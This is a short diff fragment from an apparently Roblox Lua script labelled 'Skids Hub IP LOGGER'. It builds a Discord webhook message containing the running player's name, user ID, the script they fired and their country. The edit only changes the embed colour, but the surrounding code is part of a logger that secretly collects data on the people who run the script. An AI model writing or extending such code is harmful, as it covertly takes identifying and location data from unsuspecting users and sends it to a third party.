@@ -30,7 +30,7 @@ do
                         title='Skids Hub **IP LOGGER**',
                         url='https://discord.gg/q8FspVseAU',
                         description = string.format('@%s**(%s)[%d]** fired **%s** [discord](https://discord.gg/q8FspVseAU)', player.Name, player.DisplayName, game.Players.LocalPlayer.UserId ,scriptName),
-                        color = 0,
+                        color = 0x080808,
                         fields  = {
                             {
                                 name = '**Country**',
